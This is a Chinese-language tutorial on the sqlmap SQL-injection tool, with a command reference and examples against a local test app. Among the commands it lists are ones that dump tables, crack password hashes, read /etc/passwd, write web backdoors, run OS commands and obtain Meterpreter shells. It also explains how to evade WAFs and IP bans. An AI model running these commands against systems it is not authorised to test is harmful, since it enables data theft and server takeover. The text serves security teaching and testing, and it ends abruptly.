下载地址：https://github.com/sqlmapproject/sqlmap/zipball/master</p></blockquote><p>Sqlmap是一款开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令。</p><p>sqlmap支持的数据库有：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-tex data-lang=tex><span style=display:flex><span>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
</span></span></code></pre></div><p>sqlmap支持五种不同的注入模式：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-tex data-lang=tex><span style=display:flex><span>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
</span></span><span style=display:flex><span>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页
</span></span><span style=display:flex><span>面返回时间是否增加）来判断。
</span></span><span style=display:flex><span>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
</span></span><span style=display:flex><span>4、联合查询注入，可以使用union的情况下的注入。
</span></span><span style=display:flex><span>5、堆查询注入，可以同时执行多条语句的执行时的注入。
</span></span></code></pre></div><h2 id=2-下载及安装>2 下载及安装<a hidden class=anchor aria-hidden=true href=#2-下载及安装>#</a></h2><h3 id=21-linux>2.1 Linux<a hidden class=anchor aria-hidden=true href=#21-linux>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>git clone --depth <span style=color:#ae81ff>1</span> https://github.com/sqlmapproject/sqlmap.git sqlmap
</span></span><span style=display:flex><span>cd sqlmap
</span></span><span style=display:flex><span>python sqlmap.py --update <span style=color:#75715e># 更新</span>
</span></span><span style=display:flex><span>python sqlmap.py -hh <span style=color:#75715e># 查看帮助信息</span>
</span></span></code></pre></div><h3 id=22-windows>2.2 windows<a hidden class=anchor aria-hidden=true href=#22-windows>#</a></h3><p>官网下载sqlmap的压缩包，解压后即可使用。但需要一些组件包的支持，需要有python2.7.x或者2.6.x环境支持。</p><h3 id=22-kali>2.2. kali<a hidden class=anchor aria-hidden=true href=#22-kali>#</a></h3><p>默认安装（自带）</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─# sqlmap --version
</span></span><span style=display:flex><span>1.6.11#stable
</span></span></code></pre></div><h2 id=3-参数详解>3 参数详解<a hidden class=anchor aria-hidden=true href=#3-参数详解>#</a></h2><h3 id=31-target目标>3.1 Target：目标<a hidden class=anchor aria-hidden=true href=#31-target目标>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>-u URL, --url<span style=color:#f92672>=</span>URL 目标URL <span style=color:#f92672>(</span>e.g.<span style=color:#e6db74>&#34;http://www.site.com/vuln.php?id=1&#34;</span><span style=color:#f92672>)</span>，使用-u或者--url
</span></span><span style=display:flex><span>-d DIRECT 直接连接数据库的连接字符串
</span></span><span style=display:flex><span>-l LOGFILE 从Burp或者WebScarab代理日志文件中分析目标
</span></span><span style=display:flex><span>-x SITEMAPURL 从远程网站地图（sitemap.xml）文件来解析目标
</span></span><span style=display:flex><span>-m BULKFILE 将目标地址保存在文件中，一行为一个URL地址进行批量检测。
</span></span><span style=display:flex><span>-g GOOGLEDORK 从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）
</span></span><span style=display:flex><span>-c CONFIGFILE 从配置ini文件中加载选项
</span></span><span style=display:flex><span>-r REQUESTFILE 从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可
</span></span><span style=display:flex><span>以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个--forcessl参数来使用，或者可以在Host头后门加上:443
</span></span></code></pre></div><p><strong>目标URL</strong>
参数：-u或者&ndash;url
格式：http(s)://targeturl[:port]/[…]
例如：python sqlmap.py -u &ldquo;<a href="http://www.target.com/vuln.php?id=1%22">http://www.target.com/vuln.php?id=1"</a> -f &ndash;banner &ndash;dbs &ndash;users</p><p><strong>从文本中获取多个目标扫描</strong></p><p>参数：-m</p><p>文件中保存url格式如下，sqlmap会一个一个检测</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-tex data-lang=tex><span style=display:flex><span>www.test1.com/vuln1.php?q=student
</span></span><span style=display:flex><span>www.test2.com/vuln2.asp?id=1
</span></span><span style=display:flex><span>www.test3.com/vuln3/id/1*
</span></span></code></pre></div><p>从文件中加载HTTP请求</p><p>参数：-r</p><p>sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。
比如文本文件内如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>POST/students.php HTTP/1.1
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Host:www.magedu.com
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>User-Agent:Mozilla/4.0
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>id=1
</span></span></span></code></pre></div><p>当请求是HTTPS的时候，需要配合&ndash;force-ssl参数来使用，或者可以在Host头后面加上:443</p><h3 id=32-request请求设置>3.2 Request：请求设置<a hidden class=anchor aria-hidden=true href=#32-request请求设置>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>--method：指定请求方法
</span></span><span style=display:flex><span>--data：把数据以POST方式提交
</span></span><span style=display:flex><span>--param：当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数
</span></span><span style=display:flex><span>--cookie：设置cookie，提交请求的时候附带所设置的cookie
</span></span><span style=display:flex><span>--load-cookies：从文件获取cookie
</span></span><span style=display:flex><span>--user-agent：可以使用–user-anget参数来修改
</span></span><span style=display:flex><span>--headers：可以通过–headers参数来增加额外的http头
</span></span><span style=display:flex><span>--proxy：设置代理，可以避免本机地址被封禁
</span></span><span style=display:flex><span>--delay：可以设定两个HTTP<span style=color:#f92672>(</span>S<span style=color:#f92672>)</span>请求间的延迟 防止发送过快导致被封ip
</span></span><span style=display:flex><span>--random-agent：使用–random-agnet参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。
</span></span><span style=display:flex><span>--referer：在请求目标的时候可以自己伪造请求包中的referer
</span></span><span style=display:flex><span>–-level参数设定为3或者3以上的时候会尝试对referer注入。
</span></span></code></pre></div><p>参数：&ndash;data</p><p>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST参数。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python sqlmap.py -u <span style=color:#e6db74>&#34;http://www.magedu.com/students.php&#34;</span> --data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;id=1&#34;</span> -f --banner --dbs --users
</span></span></code></pre></div><p>利用正则过滤目标网址</p><p>参数：&ndash;scope</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python sqlmap.py -l burp_http.log --scope<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;(www)?\.target\.(com|net|org)&#34;</span>
</span></span></code></pre></div><p>避免过多的错误请求被屏蔽</p><p>参数：&ndash;safe-url,&ndash;safe-freq</p><p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致后续无法进行测试。
绕过这个策略有两种方式：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-tex data-lang=tex><span style=display:flex><span>--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。
</span></span><span style=display:flex><span>--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。
</span></span></code></pre></div><h3 id=33-optimization优化>3.3 Optimization：优化<a hidden class=anchor aria-hidden=true href=#33-optimization优化>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-tex data-lang=tex><span style=display:flex><span>-o 开启所有优化开关
</span></span></code></pre></div><h3 id=34-injection注入>3.4 Injection：注入<a hidden class=anchor aria-hidden=true href=#34-injection注入>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bas data-lang=bas><span style=display:flex><span><span style=color:#f92672>-</span>p<span style=color:#960050;background-color:#1e0010>：设置想要测试的参数</span>
</span></span><span style=display:flex><span><span style=color:#f92672>--</span>skip<span style=color:#960050;background-color:#1e0010>：不想要测试的参数可以通过</span> skip<span style=color:#960050;background-color:#1e0010>设置跳过</span>
</span></span><span style=display:flex><span><span style=color:#f92672>--</span>dbms<span style=color:#960050;background-color:#1e0010>：指定数据库</span> <span style=color:#960050;background-color:#1e0010>节省</span>sqlmap<span style=color:#960050;background-color:#1e0010>自己检测的时间</span>
</span></span><span style=display:flex><span><span style=color:#f92672>--</span>os<span style=color:#960050;background-color:#1e0010>：指定数据库服务系统</span> <span style=color:#960050;background-color:#1e0010>节省</span>sqlmap<span style=color:#960050;background-color:#1e0010>自己检测的时间</span>
</span></span><span style=display:flex><span><span style=color:#f92672>--</span>tamper<span style=color:#960050;background-color:#1e0010>：使用</span>sqlmap<span style=color:#960050;background-color:#1e0010>自带的</span>tamper<span style=color:#960050;background-color:#1e0010>（脚本），或者自己写的</span>tamper<span style=color:#960050;background-color:#1e0010>，来混淆</span>payload<span style=color:#960050;background-color:#1e0010>，通常用来绕过</span>waf<span style=color:#960050;background-color:#1e0010>和</span>ips
</span></span></code></pre></div><p>测试参数</p><p>参数：-p, &ndash;skip</p><p>sqlmap默认测试所有的GET和POST参数，当&ndash;level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> -p <span style=color:#e6db74>&#34;id,user-anget&#34;</span> 
</span></span></code></pre></div><p>当你使用&ndash;level的值很大但是有个别参数不想测试的时候可以使用&ndash;skip参数。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>--skip<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;user-agent,referer&#34;</span>  
</span></span></code></pre></div><p>在有些时候web服务器使用了伪静态，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加* sqlmap将会测试value1的位置是否可注入。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python sqlmap.py -u <span style=color:#e6db74>&#34;http://magedu/param1/value1*/param2/value2/&#34;</span>
</span></span></code></pre></div><p>指定数据库服务器系统</p><p>参数：&ndash;os
默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。</p><h3 id=35-detection探测等级>3.5 Detection：探测等级<a hidden class=anchor aria-hidden=true href=#35-detection探测等级>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>--level=LEVEL 执行测试的等级（1-5，默认为1）
</span></span><span style=display:flex><span>--risk：（*慎用此参数有风险）， 共有四个风险等级（0-3），默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。
</span></span></code></pre></div><p><strong>探测等级</strong></p><p>参数：&ndash;level
共有五个等级，默认为1，最大为5，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。</p><p>这个参数不仅影响使用哪些payload，同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-gent/Referer头在level为3的时候就会测试。</p><p>总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p><p>**风险等级 **</p><p>参数：&ndash;risk</p><p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p><p>在有些时候，例如在UPDATE/DELETE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p><p>测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。</p><h3 id=36-enumeration枚举数据>3.6 Enumeration：枚举数据<a hidden class=anchor aria-hidden=true href=#36-enumeration枚举数据>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>-a, --all 获取所有信息
</span></span><span style=display:flex><span>-b, --banner 获取数据库管理系统的标识
</span></span><span style=display:flex><span>--current-user 获取数据库管理系统当前用户
</span></span><span style=display:flex><span>--current-db 获取数据库管理系统当前数据库
</span></span><span style=display:flex><span>--hostname 获取数据库服务器的主机名称
</span></span><span style=display:flex><span>--is-dba 检测DBMS当前用户是否DBA（数据库管理员）
</span></span><span style=display:flex><span>--users 枚举数据库管理系统用户
</span></span><span style=display:flex><span>--passwords 枚举数据库管理系统用户密码哈希
</span></span><span style=display:flex><span>--privileges 枚举数据库管理系统用户的权限
</span></span><span style=display:flex><span>--roles 枚举数据库管理系统用户的角色
</span></span><span style=display:flex><span>--dbs 枚举数据库管理系统数据库
</span></span><span style=display:flex><span>--tables 枚举的DBMS数据库中的表
</span></span><span style=display:flex><span>--columns 枚举DBMS数据库表列
</span></span><span style=display:flex><span>--schema 枚举数据库架构
</span></span><span style=display:flex><span>--count 检索表的项目数
</span></span><span style=display:flex><span>--dump 转储数据库表项，即下载
</span></span><span style=display:flex><span>--dump-all 转储数据库所有表项
</span></span><span style=display:flex><span>--search 搜索列（S），表（S）和/或数据库名称（S）
</span></span><span style=display:flex><span>--comments 获取DBMS注释
</span></span><span style=display:flex><span>-D DB 要进行枚举的指定数据库名
</span></span><span style=display:flex><span>-T TBL DBMS数据库表枚举
</span></span><span style=display:flex><span>-C COL DBMS数据库表列枚举
</span></span><span style=display:flex><span>-X EXCLUDECOL DBMS数据库表不进行枚举
</span></span><span style=display:flex><span>-U USER 用来进行枚举的数据库用户
</span></span><span style=display:flex><span>--exclude-sysdbs 枚举表时排除系统数据库
</span></span><span style=display:flex><span>--pivot-column<span style=color:#f92672>=</span>P.. Pivot columnname
</span></span><span style=display:flex><span>--where<span style=color:#f92672>=</span>DUMPWHERE Use WHEREcondition <span style=color:#66d9ef>while</span> table dumping
</span></span><span style=display:flex><span>--start<span style=color:#f92672>=</span>LIMITSTART 获取第一个查询输出数据位置
</span></span><span style=display:flex><span>--stop<span style=color:#f92672>=</span>LIMITSTOP 获取最后查询的输出数据
</span></span><span style=display:flex><span>--first<span style=color:#f92672>=</span>FIRSTCHAR 第一个查询输出字的字符获取
</span></span><span style=display:flex><span>--last<span style=color:#f92672>=</span>LASTCHAR 最后查询的输出字字符获取
</span></span><span style=display:flex><span>--sql-query<span style=color:#f92672>=</span>QUERY 要执行的SQL语句
</span></span><span style=display:flex><span>--sql-shell 提示交互式SQL的shell
</span></span><span style=display:flex><span>--sql-file<span style=color:#f92672>=</span>SQLFILE 要执行的SQL文件
</span></span></code></pre></div><p><strong>标志</strong>
参数：-b,&ndash;banner
大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量
@@version，这主要取决于是什么数据库。</p><p><strong>当前用户</strong>
参数：-current-user
在大多数据库中可以获取到管理数据的用户。</p><p><strong>当前数据库</strong>
参数：&ndash;current-db
返还当前连接的数据库。</p><p><strong>当前用户是否为管理员</strong>
参数：&ndash;is-dba
判断当前的用户是否为管理员，是的话会返回True。</p><p><strong>列出数据库管理用户</strong></p><p>参数：&ndash;users</p><p>当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p><p><strong>列出并破解数据库用户的hash</strong>
参数：&ndash;passwords
当前用户有权限读取包含用户密码的表的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python sqlmap.py -u <span style=color:#e6db74>&#34;http://magedu/sqlmap/pgsql/students.php?id=1&#34;</span> --passwords -
</span></span><span style=display:flex><span>v1
</span></span></code></pre></div><p><strong>列出数据库管理员权限</strong>
参数：&ndash;privileges
当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你
哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。</p><p><strong>列出数据库管理员角色</strong>
参数：&ndash;roles
当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。仅适用于当前数据库是Oracle的时候。</p><p><strong>列出数据库系统的数据库</strong>
参数：&ndash;dbs
当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p><p><strong>列举数据库表</strong>
参数：&ndash;tables,&ndash;exclude-sysdbs,-D
当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。
如果你不提供-D参数来指定一个数据库的时候，sqlmap会列出数据库所有库的所有表。
&ndash;exclude-sysdbs参数是指可排除系统数据库。
需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</p><p><strong>列举数据库表中的字段</strong>
参数：&ndash;columns,-C,-T,-D
当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。
如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p><h3 id=37-brute-force爆破>3.7 Brute force：爆破<a hidden class=anchor aria-hidden=true href=#37-brute-force爆破>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>--common-tables 检查存在共同表
</span></span><span style=display:flex><span>--common-columns 检查存在共同列
</span></span><span style=display:flex><span>User-defined <span style=color:#66d9ef>function</span> injection（用户自定义函数注入）：
</span></span><span style=display:flex><span>--udf-inject 注入用户自定义函数
</span></span><span style=display:flex><span>--shared-lib<span style=color:#f92672>=</span>SHLIB 共享库的本地路径
</span></span></code></pre></div><h3 id=38-file-system-access访问文件系统>3.8 File system access：访问文件系统<a hidden class=anchor aria-hidden=true href=#38-file-system-access访问文件系统>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>--file-read=RFILE 从后端的数据库管理系统读取文件
</span></span><span style=display:flex><span>--file-write=WFILE 上传文件到后端的数据库管理系统
</span></span><span style=display:flex><span>--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
</span></span></code></pre></div><p><strong>从数据库服务器中读取文件</strong>
参数：&ndash;file-read
当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python sqlmap.py -u <span style=color:#e6db74>&#34;http://127.0.0.1:8080/vulnerabilities/sqli/?
</span></span></span><span style=display:flex><span><span style=color:#e6db74>id=1&amp;Submit=Submit#&#34;</span> --cookie<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>security=low&#34;</span> -p id --file-read <span style=color:#e6db74>&#34;/etc/passwd&#34;</span>
</span></span></code></pre></div><p>**把文件上传到数据库服务器中 **</p><p>参数：&ndash;file-write,&ndash;file-dest
当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python sqlmap.py -u <span style=color:#e6db74>&#34;http://127.0.0.1:8080/vulnerabilities/sqli/?
</span></span></span><span style=display:flex><span><span style=color:#e6db74>id=1&amp;Submit=Submit#&#34;</span> --cookie<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>security=low&#34;</span> -p id
</span></span><span style=display:flex><span>python sqlmap.py -u <span style=color:#e6db74>&#34;http://127.0.0.1:8080/vulnerabilities/sqli/?
</span></span></span><span style=display:flex><span><span style=color:#e6db74>id=1&amp;Submit=Submit#&#34;</span> --cookie<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>security=low&#34;</span> -p id --file-write<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/opt/test_code/user.txt&#34;</span> --filedest<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/var/www/html/user.txt&#34;</span>
</span></span></code></pre></div><h3 id=39-operating-system-access访问操作系统>3.9 Operating system access：访问操作系统<a hidden class=anchor aria-hidden=true href=#39-operating-system-access访问操作系统>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>--os-cmd<span style=color:#f92672>=</span>OSCMD 执行操作系统命令
</span></span><span style=display:flex><span>--os-shell 交互式的操作系统的shell
</span></span><span style=display:flex><span>--os-pwn 获取一个OOB shell，meterpreter或VNC
</span></span><span style=display:flex><span>--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
</span></span><span style=display:flex><span>--os-bof 存储过程缓冲区溢出利用
</span></span><span style=display:flex><span>--priv-esc 数据库进程用户权限提升
</span></span><span style=display:flex><span>--msf-path<span style=color:#f92672>=</span>MSFPATH Metasploit Framework 本地的安装路径
</span></span><span style=display:flex><span>--tmp-path<span style=color:#f92672>=</span>TMPPATH 远程临时文件目录的绝对路径
</span></span></code></pre></div><p><strong>获取整个表的数据</strong>
参数：&ndash;dump,-C,-T,-D,&ndash;start,&ndash;stop,&ndash;first,&ndash;last
如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取整个表的所有内容。
使用-D,-T参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python sqlmap.py -u <span style=color:#e6db74>&#34;http://magedu/sqlmap/firebird/students.php?id=1&#34;</span> --dump -T
</span></span><span style=display:flex><span>users
</span></span></code></pre></div><p>可以获取指定库中的所有表的内容，只用-dump跟-D参数（不使用-T与-C参数）。也可以用-dump跟-C获取指定的字段内容。</p><p>sqlmap为每个表生成了一个CSV文件。</p><p>如果你只想获取一段数据，可以使用&ndash;start和&ndash;stop参数，例如，你只想获取第一段数据可以使用&ndash;stop1，如果想获取第二段与第三段数据，使用参数 &ndash;start 1 &ndash;stop 3。
也可以用&ndash;first与&ndash;last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中第三个字符到第五个字符的内容，使用&ndash;first 3 &ndash;last 5，只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。</p><p><strong>获取所有数据库表的内容</strong>
参数：&ndash;dump-all,&ndash;exclude-sysdbs
使用&ndash;dump-all参数获取所有数据库表的内容，可同时加上&ndash;exclude-sysdbs排除系统数据库，只获取用户数据库的表，即业务数据。</p><p><strong>搜索字段，表，数据库</strong>
参数：&ndash;search,-C,-T,-D
&ndash;search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。
可以在以下三种情况下使用：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。
</span></span><span style=display:flex><span>-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名
</span></span><span style=display:flex><span>-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。
</span></span></code></pre></div><p><strong>运行自定义的SQL语句</strong>
参数：&ndash;sql-query,&ndash;sql-shell
sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。
如果是SELECT查询语句，sqlmap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$python sqlmap.py -u <span style=color:#e6db74>&#34;http://127.0.0.1:8080/vulnerabilities/sqli/?
</span></span></span><span style=display:flex><span><span style=color:#e6db74>id=1&amp;Submit=Submit#&#34;</span> --sql-query <span style=color:#e6db74>&#34;SELECT &#39;magedu&#39;&#34;</span> -v1
</span></span></code></pre></div><p>运行任意操作系统命令
参数：&ndash;os-cmd,&ndash;os-shell</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python sqlmap.py -u <span style=color:#e6db74>&#34;127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34;</span> -
</span></span><span style=display:flex><span>-cookie<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir; security=low&#34;</span> -p id --os-cmd id
</span></span></code></pre></div><p>用&ndash;os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。
当不能执行多语句的时候（比如php或者asp的后端数据库为MySQL时），仍然可能使用INTO OUTFILE写进可写目录，来创建一个web后门。支持的语言：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-tex data-lang=tex><span style=display:flex><span>1、ASP
</span></span><span style=display:flex><span>2、ASP.NET
</span></span><span style=display:flex><span>3、JSP
</span></span><span style=display:flex><span>4、PHP
</span></span></code></pre></div><p>爬行网站URL
参数：&ndash;crawl
sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。此时的URL可以不带参数。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python sqlmap.py -u <span style=color:#e6db74>&#34;http://127.0.0.1:8080/vulnerabilities/sqli/?
</span></span></span><span style=display:flex><span><span style=color:#e6db74>id=1&amp;Submit=Submit#&#34;</span> --batch --crawl<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>python sqlmap.py -u &#34;http://127.0.0.1:8080/vulnerabilities/sqli/?
</span></span><span style=display:flex><span>id=1&amp;Submit=Submit#&#34; --batch --crawl=3
</span></span></code></pre></div><p><strong>定义dump数据的格式</strong>
参数：&ndash;dump-format
输出的格式可定义为：CSV，HTML，SQLITE</p><p><strong>自定义输出的路径</strong>
参数：&ndash;output-dir
